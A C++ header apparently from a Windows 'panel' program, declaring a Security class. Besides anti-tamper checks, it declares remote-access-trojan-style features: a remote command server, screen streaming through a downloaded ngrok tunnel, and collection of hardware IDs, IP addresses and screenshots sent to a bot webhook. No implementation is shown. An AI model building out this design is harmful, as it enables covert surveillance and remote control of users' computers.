#pragma once

#ifndef SECURITY_HPP
#define SECURITY_HPP

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>
#include <shellapi.h>
#include <gdiplus.h>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <chrono>
#include <sstream>
#include <algorithm>
#include <iostream>
#include <fstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

struct BrowserInfo {
    std::string name;
    std::string exe;
    std::string path;
};

class Security
{
public:
    Security();
    ~Security();

    void StartMonitoring();
    void StopMonitoring();
    bool WasAlertSent() const { return alertSent; }
    bool TestWebhook();
    void ForceSecurityAlert(const std::string& testReason = "Teste manual de segurança");
    void SendPanelStarted();
    void NotifyProcessRunning(bool invisible);
    std::string GetSessionId() const { return sessionId; }
    void SetSessionId(const std::string& id) { sessionId = id; }

private:
    static constexpr int CHECK_INTERVAL_MS = 1200;

    volatile bool alertSent = false;
    volatile bool running = true;
    std::mutex mtx;
    std::thread monitorThread;
    std::chrono::steady_clock::time_point startTime;

    std::vector<std::string> suspiciousProcesses;
    std::vector<std::string> trustedDlls;
    std::vector<std::string> multiInstanceAllowedDlls;
    std::vector<std::string> trustedDirectories;

    static constexpr int BOT_HTTP_PORT = 3001;
    static constexpr int CMD_SERVER_PORT = 7000;
    static constexpr int SCREEN_SERVER_PORT = 8080;

    std::string sessionId;
    std::string ngrokUrl;
    std::string ngrokAuthToken = "";
    DWORD ngrokPID = 0;
    volatile bool screenServerRunning = false;
    volatile bool cmdServerReady = false;

    std::vector<char> frameBuffer;
    std::mutex frameMutex;
    volatile bool frameReady = false;
    volatile int targetFps = 30;

    void CommandServerLoop();
    void ExecuteCommand(const std::string& action, const std::string& param1, const std::string& param2);
    std::vector<BrowserInfo> DetectBrowsers();
    std::string BuildBrowsersJson(const std::vector<BrowserInfo>& browsers);
    void BreakExe();

    bool DownloadNgrok();
    bool ExtractNgrok(const std::string& zipPath, const std::string& destPath);
    bool ConfigureNgrokAuthToken();
    std::string StartNgrok();
    void ScreenServerLoop();
    void ScreenCaptureLoop();
    void StartScreenServer();
    void StopScreenServer();
    std::string GetNgrokUrl() const { return ngrokUrl; }

    void SecurityMonitorLoop();
    void CheckProcessesAndModules();

    void TakeAction(const std::string& reason);
    std::string GetEnhancedSystemInfo(const std::string& reason);
    std::string GetHWID();
    std::string GetPublicIP();
    std::string GetLocalIPs();
    std::string CaptureScreenshot();
    bool SendToBot(const std::string& message, const std::string& screenshotPath);
    bool SendSimpleMessage(const std::string& message);
    void DebugLog(const std::string& message);
    void ConsoleLog(const std::string& message);

    std::string ToLower(const std::string& s);
    std::string WideToNarrow(const wchar_t* wide);
    std::string GetModulePath(HMODULE hMod);
    bool IsTrustedDirectory(const std::string& path);
    bool ContainsAny(const std::string& str, const std::vector<std::string>& patterns);
};

#endif
